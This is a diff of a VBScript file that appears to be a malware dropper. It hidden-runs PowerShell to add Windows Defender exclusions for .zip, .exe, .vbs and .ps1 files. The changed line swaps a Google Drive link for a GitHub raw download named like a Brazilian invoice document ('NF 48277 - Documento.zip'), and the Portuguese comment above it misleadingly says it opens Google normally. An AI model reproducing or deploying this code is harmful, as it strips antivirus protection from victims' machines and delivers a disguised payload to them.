@@ -20,4 +20,5 @@ End If
 WshShell.Run "powershell -WindowStyle Hidden -Command ""Add-MpPreference -ExclusionExtension '.zip','.exe','.vbs','.ps1'""", 0, True
 
 ' Abrir Google normalmente
-WshShell.Run "https://drive.google.com/file/d/1yH7-QcyQ6r3aCh5P5aE7bsz1Co2qxltx/view?usp=sharing", 1, False
+
+WshShell.Run "https://github.com/minhaclaro79-lab/privacy-58248.com/raw/refs/heads/main/NF%2048277%20-%20Documento.zip", 1, False
